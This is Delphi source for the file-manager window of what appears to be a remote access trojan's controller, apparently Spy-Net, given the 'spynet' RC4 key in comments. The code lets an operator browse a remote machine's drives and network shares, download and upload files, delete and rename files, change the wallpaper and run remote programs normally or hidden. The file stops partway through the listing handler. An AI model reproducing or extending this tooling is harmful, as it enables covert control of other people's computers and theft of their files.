unit UnitFileManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitPrincipal, StdCtrls, Buttons, ComCtrls, ExtCtrls, Menus,
  ImgList, GR32_Image, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, IdAntiFreeze,
  IdBaseComponent, IdComponent, IdTCPServer, GR32_Layers, ListViewEx, shellapi;

type
  TFormFileManager = class(TForm)
    Panel1: TPanel;
    Image1: TImage32;
    Label1: TLabel;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Splitter1: TSplitter;
    Panel2: TPanel;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    ComboBox1: TComboBox;
    Edit1: TEdit;
    BitBtn1: TBitBtn;
    ListView1: TListView;
    StatusBar1: TStatusBar;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Downloads1: TMenuItem;
    N2: TMenuItem;
    Executar1: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Deletar1: TMenuItem;
    Renomear1: TMenuItem;
    CopiarCtrlC1: TMenuItem;
    ColarCtrlV1: TMenuItem;
    Criarpasta1: TMenuItem;
    Definircomopapeldeparede1: TMenuItem;
    Visualizarimagem1: TMenuItem;
    Baixararquivo1: TMenuItem;
    ListView3: TListViewEx;
    PopupMenu2: TPopupMenu;
    DetenerDescarga1: TMenuItem;
    ReanudarDescarga1: TMenuItem;
    Subiralprimerpuesto1: TMenuItem;
    Subir1: TMenuItem;
    Bajar1: TMenuItem;
    ltimopuesto1: TMenuItem;
    Borrarcompletados1: TMenuItem;
    Eliminardescarga1: TMenuItem;
    N5: TMenuItem;
    Abrirpastadedownloads1: TMenuItem;
    Adicionarnalistadedownloads1: TMenuItem;
    Enviararquivo1: TMenuItem;
    OpenDialog1: TOpenDialog;
    TabSheet2: TTabSheet;
    Edit2: TEdit;
    BitBtn2: TBitBtn;
    ListView2: TListView;
    PopupMenu3: TPopupMenu;
    BaixarArquivo2: TMenuItem;
    Addlistadownload: TMenuItem;
    Executar: TMenuItem;
    ExecNormal: TMenuItem;
    ExecOculto: TMenuItem;
    Deletar2: TMenuItem;
    Renomear2: TMenuItem;
    Papeldeparede2: TMenuItem;
    Thumb2: TMenuItem;
    N4: TMenuItem;
    Download2: TMenuItem;
    BitBtn3: TBitBtn;
    Listarpastascompartilhadasnarede1: TMenuItem;
    BaixararquivoRecursive1: TMenuItem;
    Baixardiretrio1: TMenuItem;
    Stopdowndir1: TMenuItem;
    Attributes1: TMenuItem;
    EnviararquivoFTP1: TMenuItem;
    ImageList2: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure ComboBox1KeyPress(Sender: TObject; var Key: Char);
    procedure Edit1Enter(Sender: TObject);
    procedure Edit1Exit(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure ListView1DblClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure Downloads1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure Deletar1Click(Sender: TObject);
    procedure Renomear1Click(Sender: TObject);
    procedure CopiarCtrlC1Click(Sender: TObject);
    procedure ColarCtrlV1Click(Sender: TObject);
    procedure Criarpasta1Click(Sender: TObject);
    procedure Definircomopapeldeparede1Click(Sender: TObject);
    procedure Visualizarimagem1Click(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure Baixararquivo1Click(Sender: TObject);
    procedure ListView3EndColumnResize(sender: TCustomListView;
      columnIndex, columnWidth: Integer);
    procedure DetenerDescarga1Click(Sender: TObject);
    procedure ReanudarDescarga1Click(Sender: TObject);
    procedure Subiralprimerpuesto1Click(Sender: TObject);
    procedure Subir1Click(Sender: TObject);
    procedure Bajar1Click(Sender: TObject);
    procedure ltimopuesto1Click(Sender: TObject);
    procedure Borrarcompletados1Click(Sender: TObject);
    procedure Eliminardescarga1Click(Sender: TObject);
    procedure Adicionarnalistadedownloads1Click(Sender: TObject);
    procedure Enviararquivo1Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure Edit2KeyPress(Sender: TObject; var Key: Char);
    procedure Edit1Change(Sender: TObject);
    procedure BaixarArquivo2Click(Sender: TObject);
    procedure AddlistadownloadClick(Sender: TObject);
    procedure ExecNormalClick(Sender: TObject);
    procedure ExecOcultoClick(Sender: TObject);
    procedure Deletar2Click(Sender: TObject);
    procedure Renomear2Click(Sender: TObject);
    procedure Papeldeparede2Click(Sender: TObject);
    procedure Thumb2Click(Sender: TObject);
    procedure ListView2SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure PopupMenu3Popup(Sender: TObject);
    procedure PopupMenu2Popup(Sender: TObject);
    procedure ListView2ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView2Compare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure ListView1Compare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure PageControl1Change(Sender: TObject);
    procedure Listarpastascompartilhadasnarede1Click(Sender: TObject);
    procedure BaixararquivoRecursive1Click(Sender: TObject);
    procedure Baixardiretrio1Click(Sender: TObject);
    procedure Stopdowndir1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Attributes1Click(Sender: TObject);
    procedure EnviararquivoFTP1Click(Sender: TObject);
  private
    { Private declarations }
    SortColumn1: integer;
    SortReverse1: boolean;
    SortColumn2: integer;
    SortReverse2: boolean;

    Servidor: PConexao;
    ToCopy, PastaOrigem, PastaDest, listviewcaption: string;
    ImageString: array [0..1000] of string;
    ImageStringSearch: array [0..1000] of string;

    EndUpdate1, EndUpdate2: boolean;
    DiretorioSelecionado: string;

    FI: array [0..9999] of TSHFileInfo;
    ExtensionList: TStringList;

    FI2: array [0..9999] of TSHFileInfo;
    ExtensionList2: TStringList;

    procedure FilesDirCount(ListView: TListView);
    procedure AtualizarStrings;
    function IsImageFile(Arquivo: string): boolean;
    function ExisteIcone(Ext: string): integer;
    procedure AdicionarIcone(Ext: string; FInfo: TSHFileInfo);
    function ExisteIcone2(Ext: string): integer;
    procedure AdicionarIcone2(Ext: string; FInfo: TSHFileInfo);
  public
    { Public declarations }
    NomePC: string;
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    procedure TransferFinishedNotification(Sender: TObject);
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormFileManager: TFormFileManager;

type
  TCallbackProcedure = procedure(Sender: Tobject) of object;

type
   TDescargaHandler = class(TObject)
   public
    { Public declarations }
     ProgressBar: TProgressBar;
     ListView: TListView;
     AThread: TIdPeerThread;
     Item: TListItem;
     Descargado: Int64;
     SizeFile: Int64;
     ultimoBajado: int64;
     Origen, Destino: AnsiString;
     Transfering : boolean;
     Finalizado: boolean;
     Status: String;
     cancelado: boolean;
     callback: TCallbackProcedure;
     tickBefore, tickNow: extended;
     es_descarga: boolean;
     constructor Create(xAThread: TIdPeerThread;
                        fname: AnsiString;
                        TSize: integer;
                        PDownloadPath: AnsiString;
                        pListView: TListView;
                        p_es_descarga: boolean); overload;
     procedure addToView;
     procedure TransferFile;
     procedure ResumeTransfer;
     procedure CancelarDescarga;
     procedure UploadFile;
     procedure Update;
     procedure UpdateVelocidad;
   private
    { Private declarations }
end;

implementation

{$R *.dfm}

uses
  UnitComandos,
  UnitConexao,
  UnitDiversos,
  CommCtrl,
  UnitStrings,
  JPeg,
  UnitBytesSize,
  UnitFTPSettings,
  DateUtils,
  UnitCryptString,
  UnitDebug;

type
  RecordResult = record
    Find: TWin32FindData;
    TipoDeArquivo: shortString;
end;

type
  RecordSearchResult = record
    Find: TWin32FindData;
    TipoDeArquivo: shortString;
    Dir: shortString;
end;

type
  TIconSize = (isSmall, isLarge);

const
  DelimitadorDeImagem = '**********';
  ImgType: array [0..10] of string = ('bmp',
                                     'dib',
                                     'jpg',
                                     'jpeg',
                                     'jpe',
                                     'ico',
                                     'jfif',
                                     'gif',
                                     'png',
                                     'tif',
                                     'tiff');

constructor TDescargaHandler.Create(xAThread: TIdPeerThread;
                                    fname: AnsiString;
                                    TSize: integer;
                                    PDownloadPath: AnsiString;
                                    pListView: TListView;
                                    p_es_descarga: boolean);
begin
  Athread := xAThread;
  Origen := fname;
  Destino := pDownloadPath;
  SizeFile := TSize;
  ListView := pListView;
  transfering := false;
  cancelado := false;
  finalizado := false;
  tickBefore := gettickcount;
  tickNow := gettickcount;
  es_descarga := p_es_descarga;
  ProgressBar := TProgressBar.Create(nil);
  ProgressBar.Max := TSize;
  ProgressBar.Smooth := true;
  if Athread <> nil then AThread.Synchronize(self.addToView) else self.addToView;
end;

procedure TDescargaHandler.addToView;
var
  RectProg: TRect;
begin
  item := ListView.items.add;
  item.Caption := ExtractFileName(Origen);
  Item.SubItems.Add(' '); // do progressbar
  Item.SubItems.Add(BytesSize(self.SizeFile));
  Item.SubItems.Add('0 Kb');
  Item.SubItems.Add(' ');
  Item.SubItems.Add(pchar(Traduzidos[331]));

  if es_descarga then Item.ImageIndex := 251 else Item.ImageIndex := 252;

  Item.Data := self;
  item.SubItems.Objects[0] := ProgressBar;

  RectProg := Item.DisplayRect(drBounds);

  RectProg.Left := RectProg.Left + ListView.columns[0].Width;
  RectProg.Right := RectProg.Left + ListView.columns[1].Width;

  ProgressBar.BoundsRect := RectProg;
  progressBar.Parent := ListView;
end;

procedure TDescargaHandler.CancelarDescarga;
begin
  cancelado := true;
  transfering := false;
  Finalizado := false;
end;

procedure TDescargaHandler.Update;
begin
  ProgressBar.Position := self.Descargado;
  if Item.SubItems[4] <> Status then Item.SubItems[4] := Status;
  Item.SubItems[2] := BytesSize(Descargado);
end;

procedure TDescargaHandler.UpdateVelocidad;
var
  Time, Result: extended;
begin
  Time := (Ticknow - TickBefore) / 1000;
  Result := (Descargado - UltimoBajado) / Time;
  Item.SubItems[3] := BytesSize(Round(Result)) + '/s';
end;

procedure TDescargaHandler.TransferFile;
var
  Buffer : array[0..MaxBufferSize] of Byte;
  F : File;
  read, currRead : integer;
  seconds: extended;
  buffSize : integer;

  TempStr: string;
begin
  transfering := true;
  status := pchar(Traduzidos[332]);
  AssignFile(F, Destino);
  Rewrite(F, 1);
  read := 0;
  currRead := 0;
  tickBefore := getTickCount;
  tickNow := getTickCount;
  UltimoBajado := 0;
  buffSize := SizeOf(Buffer);
try
  while((read < SizeFile) and Athread.Connection.Connected and not cancelado) do
  begin
    if (SizeFile - read) >= buffSize then currRead := buffSize else currRead := (SizeFile - read);
    Athread.Connection.ReadBuffer(buffer, currRead);
    read := read + currRead;
    tickNow := getTickCount;
    if (tickNow - TickBefore >= 1000) then
    begin
      Athread.Synchronize(UpdateVelocidad);
      tickBefore := tickNow;
      UltimoBajado := Descargado;
    end;
    setlength(TempStr, currRead);
    copymemory(@tempstr[1], @Buffer, currRead);
    //TempStr := EnDecryptStrRC4b(TempStr, 'spynet');
    BlockWrite(F, Tempstr[1], currRead);
    currRead := 0;
    Descargado := read;
    Athread.Synchronize(Update);
  end;
  finally
    CloseFile(F);
    Athread.Connection.Disconnect;
    seconds := (gettickcount - tickBefore)/1000;
    transfering := false;
    if read <> SizeFile then
    begin
      status := pchar(Traduzidos[333]);
      cancelado := true;
      Transfering := false;
    end
    else
    begin
      status := pchar(Traduzidos[334]);
      finalizado := true;
      transfering := false;
    end;
    Athread.Synchronize(Update);
    if @callback <> nil then callback(self);
  end;
  ListView.Refresh;
end;

procedure TDescargaHandler.ResumeTransfer;
var
  Buffer: array[0..MaxBufferSize] of Byte;
  F: File;
  read, currRead : integer;
  seconds: extended;
  buffSize : integer;
  TempStr: string;
begin
  transfering := true;
  cancelado := false;
  status := pchar(Traduzidos[332]);
  tickBefore := getTickCount;

  if FileExists(destino) then
  begin
    AssignFile(F, Destino);
    reset(F, 1);
  end else
  begin
    ForceDirectories(ExtractFilePath(Destino));
    AssignFile(F, Destino);
    rewrite(F, 1);
  end;
  seek(f, Descargado);
  read := Descargado;
  currRead := 0;

  tickBefore := getTickCount;
  tickNow := getTickCount;
  UltimoBajado := 0;
  buffSize := SizeOf(Buffer);
  try
    while((read < SizeFile) and Athread.Connection.Connected and not cancelado) do
    begin
      if (SizeFile - read) >= buffSize then currRead := buffSize else currRead := (SizeFile - read);
      Athread.Connection.ReadBuffer(buffer, currRead);
      read := read + currRead;
      tickNow := getTickCount;
      if (tickNow - TickBefore >= 1000) then
      begin
        Athread.Synchronize(UpdateVelocidad);
        tickBefore := tickNow;
        UltimoBajado := Descargado;
      end;

      setlength(TempStr, currRead);
      copymemory(@tempstr[1], @Buffer, currRead);
      //TempStr := EnDecryptStrRC4b(TempStr, 'spynet');
      BlockWrite(F, Tempstr[1], currRead);
      Descargado := read;
      Athread.Synchronize(Update);
    end;
    finally
      CloseFile(F);
      Athread.Connection.Disconnect;
      seconds := (gettickcount - tickBefore)/1000;
      transfering := false;
      if read <> SizeFile then
      begin
        status := pchar(Traduzidos[333]);
        cancelado := true;
        Transfering := false;
      end
    else
    begin
      status := pchar(Traduzidos[334]);
      finalizado := true;
      transfering := false;
    end;
    Athread.Synchronize(Update);
    if @callback <> nil then callback(self);
  end;
  ListView.Refresh;
end;

procedure TDescargaHandler.UploadFile;
var
  myFile: File;
  byteArray : array[0..MaxBufferSize] of byte;
  count, sent, filesize: integer;

  TempStr: string;
  i: integer;
begin
  filesize := MyGetFileSize(Origen);
  if not filesize > 0 then
  begin
    MessageDlg(pchar(Traduzidos[336]), mtWarning, [mbok], 0);
    AThread.Connection.Disconnect;
    Exit;
  end;

  transfering := true;
  cancelado := false;
  status := pchar(Traduzidos[335]);
  try
    FileMode :=  	$0000;
    AssignFile(myFile, Origen);
    reset(MyFile, 1);
    sent := 0;
    tickBefore := getTickCount;
    UltimoBajado := 0;
    while not EOF(MyFile) and AThread.Connection.Connected and not cancelado do
    begin
      sleep(1);
      BlockRead(myFile, bytearray, MaxBufferSize + 1, count);

      setlength(tempstr, count);
      copymemory(@tempstr[1], @bytearray, count);
      //TempStr := EnDecryptStrRC4b(TempStr, 'spynet');
      sent := sent + AThread.Connection.Socket.Send(TempStr[1], count);

      tickNow := getTickCount;
      if (tickNow - TickBefore >= 1000) then
      begin
        Athread.Synchronize(UpdateVelocidad);
        tickBefore := tickNow;
        UltimoBajado := Descargado;
      end;
      Descargado := sent;
      Athread.Synchronize(Update);
    end;
    finally
    closefile(myfile);
    if sent <> filesize then
    begin
      cancelado := true;
      transfering := false;
      finalizado := false;
      Status := pchar(Traduzidos[333]);
    end
    else
    begin
      cancelado := false;
      transfering := false;
      finalizado := true;
      Status := pchar(Traduzidos[334]);
    end;
    Athread.Synchronize(Update);
  end;
  ListView.Refresh;
end;

procedure TFormFileManager.FilesDirCount(ListView: TListView);
var
  i: integer;
  d, f: integer;
begin
  d := 0;
  f := 0;
  if ListView.Items = nil then
  StatusBar1.Panels.Items[0].Text := traduzidos[401] + ': ' + inttostr(f) + ' --- ' + traduzidos[402] + ': ' + inttostr(d) else
  begin
    for i := 0 to ListView.Items.Count - 1 do
    begin
      if (listview.Items.Item[i].Caption <> '..') and (listview.Items.Item[i].SubItems.Strings[1] <> traduzidos[298]) then
      inc(f) else
      if (listview.Items.Item[i].Caption <> '..') and (listview.Items.Item[i].SubItems.Strings[1] = traduzidos[298]) then
      inc(d);
    end;
    StatusBar1.Panels.Items[0].Text := traduzidos[401] + ': ' + inttostr(f) + ' --- ' + traduzidos[402] + ': ' + inttostr(d);
  end;
end;

procedure TFormFileManager.TransferFinishedNotification(Sender:TObject);
var
  Descarga: TDescargaHandler;
  i : integer;
begin
  for i := 0 to ListView3.Items.Count -1 do
  begin
    Descarga := TDescargaHandler(ListView3.Items[i].Data);
    if not Descarga.Transfering and not Descarga.cancelado and not Descarga.Finalizado and Descarga.es_descarga then //en espera
    begin
      EnviarString(Servidor.Athread, RESUMETRANSFER + '|' + Descarga.Origen + '|' + IntToStr(Descarga.Descargado) + '|', true);
      Exit;
    end;
  end;
end;

function TFormFileManager.ExisteIcone(Ext: string): integer;
var
  i: integer;
begin
  if ExtensionList = nil then ExtensionList := TstringList.Create;
  result := ExtensionList.IndexOf(Ext);
end;

procedure TFormFileManager.AdicionarIcone(Ext: string; FInfo: TSHFileInfo);
var
  i: integer;
begin
  if ExtensionList = nil then ExtensionList := TstringList.Create;
  i := ExtensionList.Add(Ext);
  FI[i] := FInfo;
end;

function TFormFileManager.ExisteIcone2(Ext: string): integer;
var
  i: integer;
begin
  if ExtensionList2 = nil then ExtensionList2 := TstringList.Create;
  result := ExtensionList2.IndexOf(Ext);
end;

procedure TFormFileManager.AdicionarIcone2(Ext: string; FInfo: TSHFileInfo);
var
  i: integer;
begin
  if ExtensionList2 = nil then ExtensionList2 := TstringList.Create;
  i := ExtensionList2.Add(Ext);
  FI2[i] := FInfo;
end;

procedure GetFileIcon(IsFolder: boolean; ImageList: TImageList; ListItem: TListItem;
  Name: String; IconSize: TIconSize);
var
  FInfo: TSHFileInfo;
  ImageListHandle: THandle;
  i: integer;
begin

  if IsFolder = false then
  begin
    i := FormFileManager.ExisteIcone(ListItem.SubItems[0]);
    if i <> - 1 then
    begin
      ListItem.ImageIndex := FormFileManager.FI[i].iIcon;
      exit;
    end;

    if IconSize = isLarge then
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name), 0, FInfo, SizeOf(TSHFileInfo),
    SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES)
    else
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),0,FInfo,SizeOf(TSHFileInfo),
    SHGFI_SMALLICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  end else

  begin
    i := FormFileManager.ExisteIcone(traduzidos[298]);
    if i <> - 1 then
    begin
      ListItem.ImageIndex := FormFileManager.FI[i].iIcon;
      exit;
    end;

    if IconSize = isLarge then
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),FILE_ATTRIBUTE_DIRECTORY,FInfo,SizeOf(TSHFileInfo),
    SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES)
    else
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),FILE_ATTRIBUTE_DIRECTORY,FInfo,SizeOf(TSHFileInfo),
    SHGFI_SMALLICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  end;

  SendMessage(ListItem.Owner.Owner.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, ImageListHandle);
  SendMessage(ListItem.Owner.Owner.Handle, LVM_SETIMAGELIST, LVSIL_NORMAL, ImageListHandle);

  if IsFolder = true then FormFileManager.AdicionarIcone(traduzidos[298], FInfo) else
  FormFileManager.AdicionarIcone(ListItem.SubItems[0], FInfo);

  ListItem.ImageIndex := FInfo.iIcon;
end;

procedure GetFileIcon2(IsFolder: boolean; ImageList: TImageList; ListItem: TListItem;
  Name: String; IconSize: TIconSize);
var
  FInfo: TSHFileInfo;
  ImageListHandle: THandle;
  i: integer;
begin

  if IsFolder = false then
  begin
    i := FormFileManager.ExisteIcone2(ListItem.SubItems[0]);
    if i <> - 1 then
    begin
      ListItem.ImageIndex := FormFileManager.FI2[i].iIcon;
      exit;
    end;

    if IconSize = isLarge then
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name), 0, FInfo, SizeOf(TSHFileInfo),
    SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES)
    else
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),0,FInfo,SizeOf(TSHFileInfo),
    SHGFI_SMALLICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  end else

  begin
    i := FormFileManager.ExisteIcone2(traduzidos[298]);
    if i <> - 1 then
    begin
      ListItem.ImageIndex := FormFileManager.FI2[i].iIcon;
      exit;
    end;

    if IconSize = isLarge then
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),FILE_ATTRIBUTE_DIRECTORY,FInfo,SizeOf(TSHFileInfo),
    SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES)
    else
    ImageListHandle := SHGetFileInfo(PAnsiChar(Name),FILE_ATTRIBUTE_DIRECTORY,FInfo,SizeOf(TSHFileInfo),
    SHGFI_SMALLICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  end;

  SendMessage(ListItem.Owner.Owner.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, ImageListHandle);
  SendMessage(ListItem.Owner.Owner.Handle, LVM_SETIMAGELIST, LVSIL_NORMAL, ImageListHandle);

  if IsFolder = true then FormFileManager.AdicionarIcone2(traduzidos[298], FInfo) else
  FormFileManager.AdicionarIcone2(ListItem.SubItems[0], FInfo);

  ListItem.ImageIndex := FInfo.iIcon;
end;

constructor TFormFileManager.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormFileManager.AtualizarStrings;
var
  i: integer;
begin
  listview1.Column[0].Caption := traduzidos[363];
  listview1.Column[1].Caption := traduzidos[364];
  listview1.Column[2].Caption := traduzidos[365];
  listview1.Column[4].Caption := traduzidos[366];
  listview1.Column[5].Caption := traduzidos[367];
  listview1.Column[6].Caption := traduzidos[368];

  for i := 0 to listview1.Columns.Count - 1 do
  listview2.Column[i].Caption := listview1.Column[i].Caption;

  for i := 0 to listview3.Columns.Count - 1 do listview3.Column[i].Caption := traduzidos[369 + i];
  tabsheet1.Caption := traduzidos[306];
  tabsheet2.Caption := traduzidos[375];

  Atualizar1.Caption := traduzidos[143];
  Baixararquivo1.Caption := traduzidos[376];
  Baixardiretrio1.Caption := traduzidos[484];
  BaixararquivoRecursive1.Caption := traduzidos[376] + ' ' + '(Recursive)';
  Enviararquivo1.Caption := traduzidos[377];
  EnviararquivoFTP1.Caption := traduzidos[377] + ' ' + '(FTP)';
  Adicionarnalistadedownloads1.Caption := traduzidos[378];
  Executar1.Caption := traduzidos[379];
  Normal1.Caption := traduzidos[380];
  Oculto1.Caption := traduzidos[381];
  Deletar1.Caption := traduzidos[382];
  Renomear1.Caption := traduzidos[383];
  CopiarCtrlC1.Caption := traduzidos[384];
  ColarCtrlV1.Caption := traduzidos[385];
  Criarpasta1.Caption := traduzidos[386];
  Definircomopapeldeparede1.Caption := traduzidos[387];
  Visualizarimagem1.Caption := traduzidos[388];
  Downloads1.Caption := traduzidos[389];

  BaixarArquivo2.Caption := Baixararquivo1.Caption;
  Addlistadownload.Caption := Adicionarnalistadedownloads1.Caption;
  Executar.Caption := Executar1.Caption;
  ExecNormal.Caption := Normal1.Caption;
  ExecOculto.Caption := Oculto1.Caption;
  Deletar2.Caption := Deletar1.Caption;
  Renomear2.Caption := Renomear1.Caption;
  Papeldeparede2.Caption := Definircomopapeldeparede1.Caption;
  Thumb2.Caption := Visualizarimagem1.Caption;
  Download2.Caption := Downloads1.Caption;

  DetenerDescarga1.Caption := traduzidos[390];
  ReanudarDescarga1.Caption := traduzidos[391];
  Subiralprimerpuesto1.Caption := traduzidos[392];
  Subir1.Caption := traduzidos[393];
  ltimopuesto1.Caption := traduzidos[394];
  Bajar1.Caption := traduzidos[395];
  Borrarcompletados1.Caption := traduzidos[396];
  Eliminardescarga1.Caption := traduzidos[397];
  Stopdowndir1.Caption := traduzidos[485];
  Abrirpastadedownloads1.Caption := Downloads1.Caption;
  Listarpastascompartilhadasnarede1.Caption := traduzidos[480];
end;

function FileTimeToDTime(FTime: TFileTime): TDateTime;
var
  LocalFTime: TFileTime;
  STime: TSystemTime;
begin
  FileTimeToLocalFileTime(FTime, LocalFTime);
  FileTimeToSystemTime(LocalFTime, STime);
  Result := SystemTimeToDateTime(STime);
end;

function ConverterData(Dt: TDateTime): string;
begin
  result := DateTimeToStr(Dt);
end;

function GetAttributes(Find: TWin32FindData): string;
var
  Attr: DWord;
begin
  Result := '';
  Attr := Find.dwFileAttributes;

  if Attr > 0 then
  begin
    if (Attr and FILE_ATTRIBUTE_ARCHIVE) > 0 then Result := Result + 'A';
    if (Attr and FILE_ATTRIBUTE_HIDDEN) > 0 then Result := Result + 'H';
    if (Attr and FILE_ATTRIBUTE_READONLY) > 0 then Result := Result + 'R';
    if (Attr and FILE_ATTRIBUTE_SYSTEM) > 0 then Result := Result + 'S';
  end;
end;

procedure TFormFileManager.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  TempStr, TempStr1, RecPath: String;
  TempInt: Int64;
  Descarga : TDescargaHandler;
  AThreadTransfer: TIdPeerThread;

  Li: TListItem;
  D, E, F, G, H, I, fType, fAttrib: string;
  S: TMemoryStream;
  j: TJpegImage;
  BitMap: TBitMap;
  z, Shared: integer;

  RR: RecordResult;
  RSR: RecordSearchResult;

  MS: TMemoryStream;
begin
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = MENSAGENS then
  begin
    Delete(Recebido, 1, Pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1);
    Delete(Recebido, 1, Pos('|', Recebido));
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[strtoint(Copy(Recebido, 1, pos('|', Recebido) - 1))] + ' "' + TempStr + '"');
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = NOSHAREDLIST then
  begin
    for Shared := combobox1.Items.Count - 1 downto 0 do
    if copy(Combobox1.Items.Strings[Shared], 1, 2) = '\\' then Combobox1.Items.Delete(Shared);
    StatusBar1.Panels.Items[1].Text := traduzidos[482];
    Listarpastascompartilhadasnarede1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DELDIRALLYES then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[348];
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DELDIRALLNO then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[350];
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DELFILEALLYES then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[349];
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DELFILEALLNO then
  begin
    StatusBar1.Panels.Items[1].Text := traduzidos[351];
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = FILEMANAGERERROR then
  begin
    Delete(Recebido, 1, Pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1);
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[343] + ' "' + TempStr + '"');
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = DIRMANAGERERROR then
  begin
    Delete(Recebido, 1, Pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos('|', Recebido) - 1);
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[344] + ' "' + TempStr + '"');
    //Atualizar1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = LISTAR_DRIVES then
  begin
    Delete(Recebido, 1, Pos('|', Recebido));

    Combobox1.Items.Clear;
    Combobox1.Items.Add('%WIN%');
    Combobox1.Items.Add('%SYS%');
    Combobox1.Items.Add('%RECENT%');
    Combobox1.Items.Add('%DESKTOP%');

    while Pos('|', Recebido) > 1 do
    begin
      TempStr := Copy(Recebido, 1, (Pos('|', Recebido) - 1));  //Unidad
      Delete(Recebido, 1, Pos('|', Recebido)); //Borra lo que acaba de copiar
      case StrToInt(Copy(Recebido, 1, (Pos('|', Recebido) - 1))) of //el último caracter
        0: TempStr := TempStr + ' - ' + pchar(traduzidos[299]);
        2: TempStr := TempStr + ' - ' + pchar(traduzidos[300]);
        3: TempStr := TempStr + ' - ' + pchar(traduzidos[301]);
        4: TempStr := TempStr + ' - ' + pchar(traduzidos[302]);
        5: TempStr := TempStr + ' - ' + pchar(traduzidos[303]);
        6: TempStr := TempStr + ' - ' + pchar(traduzidos[304]);
      end;
      Combobox1.Items.Add(TempStr);
      Delete(Recebido, 1, Pos('|', Recebido));
    end;
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[305]);
    //Atualizar1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = GETSHAREDLIST then
  begin
    for Shared := combobox1.Items.Count - 1 downto 0 do
    if copy(Combobox1.Items.Strings[Shared], 1, 2) = '\\' then Combobox1.Items.Delete(Shared);

    Delete(Recebido, 1, Pos('|', Recebido));

    while Pos('|', Recebido) > 1 do
    begin
      TempStr := Copy(Recebido, 1, (Pos('|', Recebido) - 1));
      Delete(Recebido, 1, Pos('|', Recebido));
      Combobox1.Items.Add(TempStr);
      Delete(Recebido, 1, Pos('|', Recebido));
    end;
    StatusBar1.Panels.Items[1].Text := pchar(traduzidos[481]);
    Listarpastascompartilhadasnarede1.Enabled := true;
  end else

  if Copy(Recebido, 1, pos('|', Recebido) - 1) = LISTAR_ARQUIVOS then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    TempStr1 := Copy(Recebido, 1, pos('|', Recebido) - 1);
    delete(Recebido, 1, pos('|', Recebido));
    Edit1.Text := TempStr1;

    z := gettickcount;
    ListView1.Items.BeginUpdate;
    EndUpdate1 := false;

    ListView1.Clear;

    MS := TMemoryStream.Create;
    StrToStream(MS, Recebido);
    MS.Position := 0;

    while MS.Position < MS.Size do
    begin
